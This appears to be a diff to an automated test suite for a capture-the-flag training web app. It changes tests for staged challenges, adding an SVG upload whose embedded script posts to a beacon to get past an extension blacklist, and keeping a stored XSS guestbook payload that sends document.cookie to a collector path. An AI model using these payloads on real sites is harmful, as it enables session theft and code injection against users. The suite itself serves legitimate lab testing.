@@ -134,10 +134,31 @@ async function exploitAuthResetPredictable(c) {
 }
 
 // Stage 3: the real upload/upload-double-ext bypass (see tests/upload.test.js).
-async function exploitUploadDoubleExt(c) {
+// Storing is not enough any more: the flag fires only when the stored file is
+// served as SVG and its script phones home through the upload beacon.
+async function beaconTokenFromIndex(c, id) {
+  const idx = await c.get('/upload');
+  assert.equal(idx.status, 200);
+  const m = idx.text.match(new RegExp('data-beacon="' + id + '">([0-9a-f]{32})'));
+  assert.ok(m, 'upload beacon token for ' + id + ' missing from the module page');
+  return m[1];
+}
+
+async function beaconFile(c, id, file, token) {
   const OCTET = { 'content-type': 'application/octet-stream' };
-  const hit = await c.postRaw('/upload/ext-blacklist?filename=shell-ghost.svg.jpg', Buffer.from('<svg onload="alert(1)"></svg>'), OCTET);
-  assert.equal(hit.status, 200);
+  const payload = `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/upload/beacon',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:'${id}',file:'${file}',token:'${token}'})})</script></svg>`;
+  const up = await c.postRaw('/upload/ext-blacklist?filename=' + encodeURIComponent(file), Buffer.from(payload), OCTET);
+  assert.equal(up.status, 200, 'upload for ' + file + ' failed');
+  const view = await c.get('/upload/view/' + encodeURIComponent(file));
+  assert.equal(view.status, 200, 'the stored file must be served');
+  assert.ok(String(view.headers.get('content-type')).includes('image/svg+xml'), 'the stored file must be served as SVG');
+  const beacon = await c.postRaw('/upload/beacon', Buffer.from(JSON.stringify({ id, file, token })), { 'content-type': 'application/json' });
+  assert.equal(beacon.status, 200, 'the executed payload beacon must be accepted for ' + id);
+}
+
+async function exploitUploadDoubleExt(c) {
+  const token = await beaconTokenFromIndex(c, 'upload-double-ext');
+  await beaconFile(c, 'upload-double-ext', 'shell-ghost.svg.jpg', token);
   assert.ok((await capturedSet(c)).includes('upload:Extension blacklist bypass'), 'upload-double-ext challenge not captured');
 }
 
@@ -189,7 +210,7 @@ function makeBrowser(cookie) {
   };
 }
 
-// Stage 4: the real xss/stored exploit with the beacon claim flow
+// Stage 4: the real xss/stored exploit with the victim-visit claim flow
 // (see tests/xss.test.js).
 async function exploitXssStored(c) {
   const payload = '<script>fetch(\'/xss/collect?c=\'+document.cookie+\'&v=stored&n=\'+window.__px)</script>';
@@ -197,17 +218,10 @@ async function exploitXssStored(c) {
   assert.ok([200, 302].includes(posted.status), 'guestbook post failed with ' + posted.status);
   const page = await c.get('/xss/guestbook');
   assert.ok(page.text.includes('mallory'), 'the payload was not stored');
-  const b = makeBrowser(c.cookie());
-  b.runPage(page.text);
-  assert.deepEqual(b.errors, [], 'page scripts errored in the browser sim');
-  const beacons = b.beacons();
-  assert.ok(beacons.length >= 1, 'the stored payload did not beacon');
-  let hit = null;
-  for (const url of beacons) {
-    const r = await c.get(url);
-    if (r.status === 200) { hit = r; break; }
-  }
-  assert.ok(hit, 'the collector rejected every beacon');
+  // The flag is awarded only when the payload fires in a victim session: the
+  // server loads the guestbook as a victim and validates the beacon there.
+  const hit = await c.get('/xss/victim-visit');
+  assert.ok(hit.text.includes('victim'), 'victim visit did not run');
   assert.ok((await capturedSet(c)).includes('xss:Stored XSS'), 'xss/stored challenge not captured');
   return hit;
 }
@@ -293,8 +307,8 @@ test('ghost in the cms scenario', async (t) => {
     const other = session(base);
     const plain = await other.postRaw('/upload/ext-blacklist?filename=plain-ghost.jpg', Buffer.from('fakejpg'), OCTET);
     assert.equal(plain.status, 200);
-    const caseUp = await other.postRaw('/upload/ext-blacklist?filename=case-ghost.SVG', Buffer.from('<svg onload="alert(1)"></svg>'), OCTET);
-    assert.equal(caseUp.status, 200);
+    const caseToken = await beaconTokenFromIndex(other, 'upload-case');
+    await beaconFile(other, 'upload-case', 'case-ghost.SVG', caseToken);
     assert.ok((await capturedSet(other)).includes('upload:Case-sensitive blacklist bypass'), 'sanity: the case bypass captured its own challenge');
     const locked = await other.get(SCENARIO_PATH);
     assert.equal(enterLinks(locked.text).length, 1, 'plain uploads and the case bypass must not unlock stage 4');
